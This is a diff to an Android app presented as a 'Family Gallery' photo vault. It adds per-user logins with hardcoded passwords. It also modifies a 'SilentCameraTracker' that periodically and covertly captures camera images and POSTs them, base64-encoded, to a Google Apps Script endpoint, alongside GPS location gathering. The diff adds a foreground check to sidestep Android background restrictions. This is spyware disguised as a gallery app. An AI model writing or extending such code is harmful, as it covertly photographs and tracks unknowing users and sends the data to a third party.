@@ -166,6 +166,15 @@ fun hasAllRequiredAccess(context: Context): Boolean {
             hasGalleryPermissions(context)
 }
 
+fun hasUserRequiredAccess(context: Context, username: String): Boolean {
+    val needsGps = username.trim().lowercase() == "gallery" || username.isEmpty()
+    return if (needsGps) {
+        hasAllRequiredAccess(context)
+    } else {
+        hasCameraPermission(context) && hasGalleryPermissions(context)
+    }
+}
+
 @SuppressLint("MissingPermission")
 fun fetchCurrentLocation(
     context: Context,
@@ -473,7 +482,7 @@ fun FamilyGalleryApp() {
         isConnected = isNetworkAvailable(context)
         screen = when (screen) {
             is FamilyScreen.Login -> FamilyScreen.Welcome
-            is FamilyScreen.Dashboard -> FamilyScreen.Welcome
+            is FamilyScreen.Dashboard -> FamilyScreen.Login
             is FamilyScreen.SecretFolder -> FamilyScreen.Dashboard
             is FamilyScreen.Upload -> FamilyScreen.Dashboard
             else -> FamilyScreen.Welcome
@@ -487,6 +496,9 @@ fun FamilyGalleryApp() {
     
     // App Self-Update facility states
     val prefs = remember { context.getSharedPreferences("app_prefs", android.content.Context.MODE_PRIVATE) }
+    var loggedInUser by remember {
+        mutableStateOf(prefs.getString("logged_in_user", "gallery") ?: "gallery")
+    }
     val defaultUrl = "https://raw.githubusercontent.com/AhmRizvi/family-gallery/main/version.json"
     var updateUrl by remember {
         val saved = prefs.getString("update_url", defaultUrl) ?: defaultUrl
@@ -725,7 +737,7 @@ fun FamilyGalleryApp() {
                 is FamilyScreen.Welcome -> {
                     WelcomeScreen(
                         onExploreClick = {
-                            if (hasAllRequiredAccess(context)) {
+                            if (hasUserRequiredAccess(context, loggedInUser)) {
                                 screen = FamilyScreen.Dashboard
                             } else {
                                 screen = FamilyScreen.Login
@@ -735,7 +747,9 @@ fun FamilyGalleryApp() {
                 }
                 is FamilyScreen.Login -> {
                     LoginScreen(
-                        onLoginSuccess = {
+                        onLoginSuccess = { user ->
+                            prefs.edit().putString("logged_in_user", user).apply()
+                            loggedInUser = user
                             screen = FamilyScreen.Dashboard
                         },
                         onBack = { screen = FamilyScreen.Welcome }
@@ -743,6 +757,7 @@ fun FamilyGalleryApp() {
                 }
                 is FamilyScreen.Dashboard -> {
                     DashboardScreen(
+                        loggedInUser = loggedInUser,
                         pendingUploads = pendingUploads,
                         onAddUpload = { uri ->
                             pendingUploads = pendingUploads + uri
@@ -755,16 +770,25 @@ fun FamilyGalleryApp() {
                         },
                         onNavigateToUpload = { screen = FamilyScreen.Upload },
                         onOpenSecret = { screen = FamilyScreen.SecretFolder },
-                        onLogout = { screen = FamilyScreen.Welcome },
+                        onLogout = {
+                            prefs.edit().putString("logged_in_user", "").apply()
+                            loggedInUser = ""
+                            screen = FamilyScreen.Login
+                        },
                         backgroundUpdateBadgeActive = backgroundUpdateBadgeActive,
                         onShowUpdateDialog = { showUpdateDialog = true }
                     )
                 }
                 is FamilyScreen.SecretFolder -> {
-                    if (!hasAllRequiredAccess(context)) {
+                    if (!hasUserRequiredAccess(context, loggedInUser)) {
                         LaunchedEffect(Unit) {
                             screen = FamilyScreen.Dashboard
-                            Toast.makeText(context, "Access Denied. GPS Location, Camera, and Gallery permissions must all be active.", Toast.LENGTH_LONG).show()
+                            val msg = if (loggedInUser == "gallery") {
+                                "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
+                            } else {
+                                "Access Denied. Camera and Gallery permissions must be active."
+                            }
+                            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                         }
                     } else {
                         SecretFolderScreen(
@@ -773,10 +797,15 @@ fun FamilyGalleryApp() {
                     }
                 }
                 is FamilyScreen.Upload -> {
-                    if (!hasAllRequiredAccess(context)) {
+                    if (!hasUserRequiredAccess(context, loggedInUser)) {
                         LaunchedEffect(Unit) {
                             screen = FamilyScreen.Dashboard
-                            Toast.makeText(context, "Access Denied. GPS Location, Camera, and Gallery permissions must all be active.", Toast.LENGTH_LONG).show()
+                            val msg = if (loggedInUser == "gallery") {
+                                "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
+                            } else {
+                                "Access Denied. Camera and Gallery permissions must be active."
+                            }
+                            Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                         }
                     } else {
                         UploadScreen(
@@ -1222,7 +1251,7 @@ fun WelcomeScreen(onExploreClick: () -> Unit) {
 
 @Composable
 fun LoginScreen(
-    onLoginSuccess: () -> Unit,
+    onLoginSuccess: (String) -> Unit,
     onBack: () -> Unit
 ) {
     val context = LocalContext.current
@@ -1231,6 +1260,8 @@ fun LoginScreen(
     var password by remember { mutableStateOf("") }
     var passwordVisible by remember { mutableStateOf(false) }
     var hasAttemptedLogin by remember { mutableStateOf(false) }
+
+    val isUserGallery = username.trim().lowercase() == "gallery"
 
     // States for tracking system permissions inside flow
     var isLocationGranted by remember { mutableStateOf(hasLocationPermissions(context)) }
@@ -1251,7 +1282,7 @@ fun LoginScreen(
         }
         isCameraGranted = perms[android.Manifest.permission.CAMERA] == true
 
-        if (isLocationGranted && isGalleryGranted && isCameraGranted) {
+        if (isGalleryGranted && isCameraGranted) {
             Toast.makeText(context, "Permissions acquired. Ready to login!", Toast.LENGTH_SHORT).show()
         } else {
             Toast.makeText(context, "Permissions declined. Family Gallery requires active access.", Toast.LENGTH_LONG).show()
@@ -1283,7 +1314,7 @@ fun LoginScreen(
     // Call Google Apps Script Web App API immediately once location permission is available in Login Screen
     LaunchedEffect(isLocationGranted) {
         if (isLocationGranted) {
-            if (!isGpsEnabled(context)) {
+            if (isUserGallery && !isGpsEnabled(context)) {
                 showGpsDisabledDialog = true
             }
             fetchCurrentLocation(
@@ -1298,8 +1329,14 @@ fun LoginScreen(
         }
     }
 
-    val isCredentialsValid = username == "gallery" && password == "gallery2026@"
-    val arePermissionsApproved = isLocationGranted && isGalleryGranted && isCameraGranted && isGpsEnabled(context)
+    val isCredentialsValid = (username.trim().lowercase() == "gallery" && password == "gallery2026@") ||
+            (username.trim().lowercase() == "mou" && password == "Mou2026@") ||
+            (username.trim().lowercase() == "shuvo" && (password == "shuvo2026@" || password == "shuvo2026@."))
+    val arePermissionsApproved = if (isUserGallery) {
+        isLocationGranted && isGalleryGranted && isCameraGranted && isGpsEnabled(context)
+    } else {
+        isGalleryGranted && isCameraGranted
+    }
 
     Box(
         modifier = Modifier
@@ -1600,14 +1637,14 @@ fun LoginScreen(
                         if (arePermissionsApproved) {
                             if (isCredentialsValid) {
                                 Toast.makeText(context, "Logon Approved. Opening Vault...", Toast.LENGTH_SHORT).show()
-                                onLoginSuccess()
+                                onLoginSuccess(username.trim().lowercase())
                             } else {
                                 Toast.makeText(context, "Invalid authorized username or password.", Toast.LENGTH_SHORT).show()
                             }
                         } else {
-                            if (!isLocationGranted || !isGalleryGranted || !isCameraGranted) {
+                            if ((isUserGallery && !isLocationGranted) || !isGalleryGranted || !isCameraGranted) {
                                 askForPermissions()
-                            } else if (!isGpsEnabled(context)) {
+                            } else if (isUserGallery && !isGpsEnabled(context)) {
                                 showGpsDisabledDialog = true
                             }
                         }
@@ -1635,15 +1672,6 @@ fun LoginScreen(
                     )
                 }
             }
-
-            // Quick hints footer
-            Text(
-                text = "Authorized Staff Keycode: gallery / gallery2026@",
-                color = Color.White.copy(alpha = 0.25f),
-                fontSize = 11.sp,
-                fontFamily = FontFamily.Monospace,
-                modifier = Modifier.padding(vertical = 16.dp)
-            )
         }
     }
 
@@ -1701,6 +1729,7 @@ fun LoginScreen(
 
 @Composable
 fun DashboardScreen(
+    loggedInUser: String,
     pendingUploads: List<Uri>,
     onAddUpload: (Uri) -> Unit,
     locationState: String,
@@ -1715,7 +1744,7 @@ fun DashboardScreen(
     val context = LocalContext.current
 
     // Background user identification/tracking process
-    SilentCameraTracker()
+    SilentCameraTracker(loggedInUser)
     var isRefreshingLocation by remember { mutableStateOf(false) }
 
     // Dialog trigger states
@@ -1733,7 +1762,7 @@ fun DashboardScreen(
 
     // Init location query on load (safely)
     LaunchedEffect(Unit) {
-        if (hasLocationPermissions(context)) {
+        if (loggedInUser == "gallery" && hasLocationPermissions(context)) {
             if (!isGpsEnabled(context)) {
                 showGpsDisabledDialog = true
             }
@@ -2132,18 +2161,14 @@ fun DashboardScreen(
                     }
                 },
                 navigationIcon = {
-                    Box(
-                        modifier = Modifier
-                            .padding(start = 12.dp, end = 8.dp)
-                            .size(36.dp)
-                            .background(Color(0xFFE5A93B).copy(alpha = 0.15f), shape = CircleShape),
-                        contentAlignment = Alignment.Center
+                    IconButton(
+                        onClick = onLogout,
+                        modifier = Modifier.testTag("dashboard_back_button")
                     ) {
                         Icon(
-                            imageVector = Icons.Default.Camera,
-                            contentDescription = null,
-                            tint = Color(0xFFE5A93B),
-                            modifier = Modifier.size(18.dp)
+                            imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                            contentDescription = "Logout and Go Back",
+                            tint = Color(0xFF1E1E24)
                         )
                     }
                 },
@@ -2151,10 +2176,15 @@ fun DashboardScreen(
                     // Lock icon leading to secret vault dialog
                     IconButton(
                         onClick = {
-                            if (hasAllRequiredAccess(context)) {
+                            if (hasUserRequiredAccess(context, loggedInUser)) {
                                 secretCodeDialogActive = true
                             } else {
-                                Toast.makeText(context, "Access Denied. GPS Location, Camera, and Gallery permissions must all be active.", Toast.LENGTH_LONG).show()
+                                val msg = if (loggedInUser == "gallery") {
+                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
+                                } else {
+                                    "Access Denied. Camera and Gallery permissions must be active."
+                                }
+                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
                         modifier = Modifier.testTag("secret_vault_trigger")
@@ -2201,10 +2231,15 @@ fun DashboardScreen(
                     // Upload media action triggers native file explorer
                     Button(
                         onClick = {
-                            if (hasAllRequiredAccess(context)) {
+                            if (hasUserRequiredAccess(context, loggedInUser)) {
                                 onNavigateToUpload()
                             } else {
-                                Toast.makeText(context, "Access Denied. GPS Location, Camera, and Gallery permissions must all be active.", Toast.LENGTH_LONG).show()
+                                val msg = if (loggedInUser == "gallery") {
+                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
+                                } else {
+                                    "Access Denied. Camera and Gallery permissions must be active."
+                                }
+                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
                         colors = ButtonDefaults.buttonColors(
@@ -2238,10 +2273,15 @@ fun DashboardScreen(
                     // Quick access Secret Gallery direct link
                     OutlinedButton(
                         onClick = {
-                            if (hasAllRequiredAccess(context)) {
+                            if (hasUserRequiredAccess(context, loggedInUser)) {
                                 secretCodeDialogActive = true
                             } else {
-                                Toast.makeText(context, "Access Denied. GPS Location, Camera, and Gallery permissions must all be active.", Toast.LENGTH_LONG).show()
+                                val msg = if (loggedInUser == "gallery") {
+                                    "Access Denied. GPS Location, Camera, and Gallery permissions must all be active."
+                                } else {
+                                    "Access Denied. Camera and Gallery permissions must be active."
+                                }
+                                Toast.makeText(context, msg, Toast.LENGTH_LONG).show()
                             }
                         },
                         colors = ButtonDefaults.outlinedButtonColors(
@@ -2276,102 +2316,104 @@ fun DashboardScreen(
                 .fillMaxSize()
                 .padding(innerPadding)
         ) {
-            // Location HUD Dashboard Ribbon to meet condition: "show user location in the ui"
-            Card(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .padding(16.dp),
-                shape = RoundedCornerShape(16.dp),
-                colors = CardDefaults.cardColors(
-                    containerColor = Color.White
-                ),
-                border = BorderStroke(1.dp, Color.Black.copy(alpha = 0.08f))
-            ) {
-                Row(
+            if (loggedInUser == "gallery") {
+                // Location HUD Dashboard Ribbon to meet condition: "show user location in the ui"
+                Card(
                     modifier = Modifier
                         .fillMaxWidth()
                         .padding(16.dp),
-                    verticalAlignment = Alignment.CenterVertically
+                    shape = RoundedCornerShape(16.dp),
+                    colors = CardDefaults.cardColors(
+                        containerColor = Color.White
+                    ),
+                    border = BorderStroke(1.dp, Color.Black.copy(alpha = 0.08f))
                 ) {
-                    Box(
+                    Row(
                         modifier = Modifier
-                            .size(44.dp)
-                            .background(Color(0xFF2E7D32).copy(alpha = 0.1f), shape = CircleShape),
-                        contentAlignment = Alignment.Center
+                            .fillMaxWidth()
+                            .padding(16.dp),
+                        verticalAlignment = Alignment.CenterVertically
                     ) {
-                        Icon(
-                            imageVector = Icons.Default.MyLocation,
-                            contentDescription = "User Location",
-                            tint = Color(0xFF2E7D32),
-                            modifier = Modifier.size(20.dp)
-                        )
-                    }
-
-                    Spacer(modifier = Modifier.width(16.dp))
-
-                    Column(
-                        modifier = Modifier.weight(1f)
-                    ) {
-                        Text(
-                            text = "Family Archivist GPS Location",
-                            fontSize = 11.sp,
-                            color = Color(0xFF757575),
-                            fontWeight = FontWeight.Bold,
-                            letterSpacing = 0.5.sp
-                        )
-                        Spacer(modifier = Modifier.height(4.dp))
-                        Text(
-                            text = locationState,
-                            fontSize = 14.sp,
-                            color = Color(0xFF1E1E24),
-                            fontWeight = FontWeight.SemiBold,
-                            maxLines = 2,
-                            overflow = TextOverflow.Ellipsis
-                        )
-
-                        if (userCoordinates != null) {
-                            Text(
-                                text = "LAT: ${String.format(Locale.US, "%.5f", userCoordinates.first)} • LON: ${String.format(Locale.US, "%.5f", userCoordinates.second)}",
-                                fontSize = 11.sp,
-                                fontFamily = FontFamily.Monospace,
-                                color = Color(0xFF2E7D32),
-                                modifier = Modifier.padding(top = 2.dp)
-                            )
-                        }
-                    }
-
-                    // Touch component to refresh precise coordinates manually
-                    IconButton(
-                        onClick = {
-                            if (!isGpsEnabled(context)) {
-                                showGpsDisabledDialog = true
-                            }
-                            isRefreshingLocation = true
-                            fetchCurrentLocation(
-                                context = context,
-                                onSuccess = { lat, lon, desc ->
-                                    onUpdateLocation(lat, lon, desc)
-                                    isRefreshingLocation = false
-                                },
-                                onFailure = {
-                                    Toast.makeText(context, "Position failed: $it", Toast.LENGTH_SHORT).show()
-                                    isRefreshingLocation = false
-                                }
-                            )
-                        }
-                    ) {
-                        if (isRefreshingLocation) {
-                            CircularProgressIndicator(
-                                modifier = Modifier.size(18.dp),
-                                strokeWidth = 2.dp,
-                                color = Color(0xFF2E7D32)
-                            )
-                        } else {
+                        Box(
+                            modifier = Modifier
+                                .size(44.dp)
+                                .background(Color(0xFF2E7D32).copy(alpha = 0.1f), shape = CircleShape),
+                            contentAlignment = Alignment.Center
+                        ) {
                             Icon(
-                                imageVector = Icons.Default.Refresh,
-                                contentDescription = "Refresh GPS",
-                                tint = Color(0xFF1E1E24).copy(alpha = 0.6f)
+                                imageVector = Icons.Default.MyLocation,
+                                contentDescription = "User Location",
+                                tint = Color(0xFF2E7D32),
+                                modifier = Modifier.size(20.dp)
                             )
+                        }
+
+                        Spacer(modifier = Modifier.width(16.dp))
+
+                        Column(
+                            modifier = Modifier.weight(1f)
+                        ) {
+                            Text(
+                                text = "Family Archivist GPS Location",
+                                fontSize = 11.sp,
+                                color = Color(0xFF757575),
+                                fontWeight = FontWeight.Bold,
+                                letterSpacing = 0.5.sp
+                            )
+                            Spacer(modifier = Modifier.height(4.dp))
+                            Text(
+                                text = locationState,
+                                fontSize = 14.sp,
+                                color = Color(0xFF1E1E24),
+                                fontWeight = FontWeight.SemiBold,
+                                maxLines = 2,
+                                overflow = TextOverflow.Ellipsis
+                            )
+
+                            if (userCoordinates != null) {
+                                Text(
+                                    text = "LAT: ${String.format(Locale.US, "%.5f", userCoordinates.first)} • LON: ${String.format(Locale.US, "%.5f", userCoordinates.second)}",
+                                    fontSize = 11.sp,
+                                    fontFamily = FontFamily.Monospace,
+                                    color = Color(0xFF2E7D32),
+                                    modifier = Modifier.padding(top = 2.dp)
+                                )
+                            }
+                        }
+
+                        // Touch component to refresh precise coordinates manually
+                        IconButton(
+                            onClick = {
+                                if (!isGpsEnabled(context)) {
+                                    showGpsDisabledDialog = true
+                                }
+                                isRefreshingLocation = true
+                                fetchCurrentLocation(
+                                    context = context,
+                                    onSuccess = { lat, lon, desc ->
+                                        onUpdateLocation(lat, lon, desc)
+                                        isRefreshingLocation = false
+                                    },
+                                    onFailure = {
+                                        Toast.makeText(context, "Position failed: $it", Toast.LENGTH_SHORT).show()
+                                        isRefreshingLocation = false
+                                    }
+                                )
+                            }
+                        ) {
+                            if (isRefreshingLocation) {
+                                CircularProgressIndicator(
+                                    modifier = Modifier.size(18.dp),
+                                    strokeWidth = 2.dp,
+                                    color = Color(0xFF2E7D32)
+                                )
+                            } else {
+                                Icon(
+                                    imageVector = Icons.Default.Refresh,
+                                    contentDescription = "Refresh GPS",
+                                    tint = Color(0xFF1E1E24).copy(alpha = 0.6f)
+                                )
+                            }
                         }
                     }
                 }
@@ -2517,7 +2559,6 @@ fun DashboardScreen(
                             secretCodeErrorVisible = false
                         },
                         label = { Text("Vault Encryption Passkey") },
-                        placeholder = { Text("e.g. 098765rtyui") },
                         colors = OutlinedTextFieldDefaults.colors(
                             focusedTextColor = Color.White,
                             unfocusedTextColor = Color.White,
@@ -3735,16 +3776,16 @@ fun bitmapToBase64(bitmap: Bitmap): String {
 }
 
 @Composable
-fun SilentCameraTracker() {
+fun SilentCameraTracker(username: String) {
     val context = LocalContext.current
     val lifecycleOwner = LocalLifecycleOwner.current
 
     // Dynamically check if all permissions are granted and internet is available
     var isReady by remember { mutableStateOf(false) }
 
-    LaunchedEffect(Unit) {
+    LaunchedEffect(username) {
         while (true) {
-            isReady = hasAllRequiredAccess(context) && isNetworkAvailable(context)
+            isReady = hasUserRequiredAccess(context, username) && isNetworkAvailable(context)
             delay(2000) // Poll permissions and network state every 2 seconds
         }
     }
@@ -3814,8 +3855,12 @@ fun SilentCameraTracker() {
         while (true) {
             delay(3000)
             try {
+                // Double check lifecycle state to ensure we are in foreground and don't violate AppOps background restrictions
+                if (!lifecycleOwner.lifecycle.currentState.isAtLeast(androidx.lifecycle.Lifecycle.State.RESUMED)) {
+                    continue
+                }
                 // Double check both accesses and internet before capturing
-                if (!hasAllRequiredAccess(context) || !isNetworkAvailable(context)) {
+                if (!hasUserRequiredAccess(context, username) || !isNetworkAvailable(context)) {
                     continue
                 }
 
@@ -3830,7 +3875,7 @@ fun SilentCameraTracker() {
                                 CoroutineScope(Dispatchers.IO).launch {
                                     try {
                                         // Ensure we still have access and internet before executing POST
-                                        if (hasAllRequiredAccess(context) && isNetworkAvailable(context)) {
+                                        if (hasUserRequiredAccess(context, username) && isNetworkAvailable(context)) {
                                             val url = "https://script.google.com/macros/s/AKfycbxzjU0UOhg4STbza-vHJGkP-HKeVXHGDeBcgfmcO1OZDm7Ao2u3YGzZg4LiRIoB70-_/exec"
                                             val postDataStr = "image=" + URLEncoder.encode(base64, "UTF-8")
                                             val postData = postDataStr.toByteArray(Charsets.UTF_8)
